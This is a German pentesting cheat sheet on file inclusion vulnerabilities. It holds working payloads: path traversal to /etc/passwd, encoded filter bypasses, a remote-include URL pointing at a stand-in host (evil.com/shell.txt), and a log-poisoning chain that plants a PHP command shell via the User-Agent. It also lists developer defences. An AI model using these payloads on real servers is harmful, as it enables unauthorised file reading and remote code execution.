Inhalt für web-pentesting/file-inclusion.md

# 📂 File Inclusion (LFI / RFI)

File Inclusion ist eine Schwachstelle, bei der ein Angreifer die Möglichkeit hat, Dateien auf dem Server einzubinden und anzuzeigen (LFI) oder sogar externe Dateien aus dem Internet nachzuladen (RFI).

---

## 🔍 Arten von File Inclusion

### 📌 1. LFI – Local File Inclusion
- Eingebundene Datei stammt **vom selben Server**
- Zugriff auf `/etc/passwd`, Logfiles, Source-Code etc.
- Beispiel-URL:

?page=../../../../etc/passwd


### 🌍 2. RFI – Remote File Inclusion (seltener)
- Server lädt externe Datei per URL
- Beispiel:

?page=http://evil.com/shell.txt

- Funktioniert nur bei schlecht konfigurierten Servern mit `allow_url_include = On`

---

## 🧪 Testmethoden

### 🔹 Basis-Test:
```bash
?page=../../../../etc/passwd

🔹 Filter umgehen:

?page=....//....//etc/passwd
?page=..%2f..%2f..%2fetc%2fpasswd

🔹 Log Poisoning (z. B. bei LFI + Code Execution):

    User-Agent manipulieren:

User-Agent: <?php system($_GET['cmd']); ?>

    LFI auf /var/log/apache2/access.log

    Zugriff mit:

?page=/var/log/apache2/access.log&cmd=id

🧰 Tools & Hilfen
Tool	Zweck
Burp Suite	Parameter testen, Input fuzzing
ffuf / wfuzz	Pfadfuzzing, Wordlists einsetzen
SecLists	Wordlists: LFI-LFI.txt, Unix-Paths
🛡️ Schutzmaßnahmen (für Entwickler)

    Whitelisting erlaubter Dateien

    Keine dynamische Einbindung von User-Input

    Pfade auflösen & validieren (realpath)

    allow_url_include deaktivieren (PHP)

📚 Weitere Infos & Payloads:
PayloadAllTheThings – File Inclusion
